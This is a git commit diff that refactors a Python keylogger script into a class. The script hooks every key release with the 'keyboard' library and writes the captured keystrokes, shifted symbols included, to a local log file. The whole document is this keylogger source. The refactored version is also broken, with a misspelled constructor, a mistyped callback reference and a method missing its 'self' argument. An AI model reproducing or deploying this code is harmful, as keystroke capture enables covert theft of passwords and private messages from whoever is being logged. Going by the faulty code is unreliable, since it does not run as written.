ee367a2fcbb10d71a49f1965e8c04ad7ae3ab56d
Benmochka <benjamin.vaniche@gmail.com>
2024-02-12 10:36:09 +0200

    Turned the function to a class

--- Keylogger.py
+++ Keylogger.py
@@ -1,30 +1,34 @@
 import keyboard
-report_file = open("Keys.txt","w")
-def new_key(event):
-    button = event.name
-    if button == "space":
-        button = " "
-    if button == "enter":
-        button = "/n" 
-    if button == "tab":
-        button = "/n" 
-    if button == "shift"+"9":
-        button = "("
-    if button == "shift"+"0":
-        button = ")"
-    if button == "shift"+"1":
-        button = "!"   
-    if button == "shift"+"2":
-        button = "@"
-    if button == "shift"+"3":
-        button = "#"
-    if button == "shift"+"5":
-        button = "%"
-    if button == "shift"+"7":
-        button = "&"   
-    if button == "shift"+"8":
-        button = "*"
-    report_file.write(button)
-    report_file.flush()
-keyboard.on_release(callback=new_key)    
-keyboard.wait()
+class Keylogger():
+    def __innit__(self, log_filename):
+        self.f = open(log_filename,"w")
+    def start_log(self):
+        keyboard.on_release(callback=nself.callback)    
+        keyboard.wait()
+    def new_key(event):
+        button = event.name
+        if button == "space":
+            button = " "
+        if button == "enter":
+            button = "/n" 
+        if button == "tab":
+            button = "/n" 
+        if button == "shift"+"9":
+            button = "("
+        if button == "shift"+"0":
+            button = ")"
+        if button == "shift"+"1":
+            button = "!"   
+        if button == "shift"+"2":
+            button = "@"
+        if button == "shift"+"3":
+            button = "#"
+        if button == "shift"+"5":
+            button = "%"
+        if button == "shift"+"7":
+            button = "&"   
+        if button == "shift"+"8":
+            button = "*"
+        self.f.write(button)
+        self.f.flush()
+
